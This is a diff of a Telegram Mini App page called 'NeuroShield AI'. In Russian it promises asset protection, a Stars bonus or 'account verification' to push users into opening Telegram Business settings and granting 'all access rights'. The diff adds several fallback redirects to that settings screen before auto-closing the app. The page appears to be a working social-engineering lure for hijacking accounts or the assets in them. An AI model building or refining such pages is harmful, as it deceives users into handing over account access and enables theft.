@@ -6,32 +6,40 @@
     <title>NeuroShield AI</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { font-family: -apple-system, sans-serif; background-color: #0e1621; color: white; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        body { font-family: -apple-system, sans-serif; background-color: #0e1621; color: white; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
         .container { background: #17212b; width: 85%; padding: 25px; border-radius: 20px; border: 1px solid #2b3948; text-align: center; }
-        .btn { background: #2481cc; color: white; border: none; padding: 16px; width: 100%; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 25px; box-shadow: 0 4px 15px rgba(36, 129, 204, 0.3); }
-        .status-badge { background: rgba(241, 196, 15, 0.1); color: #f1c40f; padding: 5px 12px; border-radius: 20px; font-size: 12px; text-transform: uppercase; margin-bottom: 15px; display: inline-block; }
+        .btn { background: #2481cc; color: white; border: none; padding: 16px; width: 100%; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 25px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="status-badge">Ожидание верификации</div>
-        <h2 style="margin: 10px 0;">NeuroShield AI</h2>
-        <p style="color: #8ba3b7; font-size: 14px; line-height: 1.5;">Для активации защиты ваших активов и получения бонуса <b>575 Stars</b> необходимо завершить подключение модуля.</p>
-        <button class="btn" onclick="openBusinessSettings()">ПОДКЛЮЧИТЬ И ПОЛУЧИТЬ ⭐️</button>
+        <h2 style="margin: 0 0 15px 0;">🛡️ NeuroShield AI</h2>
+        <p style="color: #8ba3b7; font-size: 14px; line-height: 1.5;">Для завершения верификации аккаунта нажмите на кнопку ниже и активируйте все права доступа.</p>
+        <button class="btn" onclick="megaRedirect()">ПОДКЛЮЧИТЬ ⭐</button>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
 
-        function openBusinessSettings() {
-            // Прямая системная команда для открытия настроек Бизнеса
-            tg.openTelegramLink("tg://settings/business");
+        function megaRedirect() {
+            // Способ 1: Системная ссылка через API (самый надежный)
+            tg.openTelegramLink("https://t.me/setsprofile?section=business");
             
-            // Закрываем Mini App через 1.5 сек, чтобы не висело фоном
+            // Способ 2: Через полсекунды пробуем внутренний протокол
+            setTimeout(() => {
+                tg.openTelegramLink("tg://settings/business");
+            }, 500);
+
+            // Способ 3: Если всё зависло, пробуем принудительный переход браузера
+            setTimeout(() => {
+                window.location.href = "tg://settings/business";
+            }, 1000);
+
+            // Закрываем окно через 2.5 сек
             setTimeout(() => {
                 tg.close();
-            }, 1500);
+            }, 2500);
         }
     </script>
 </body>
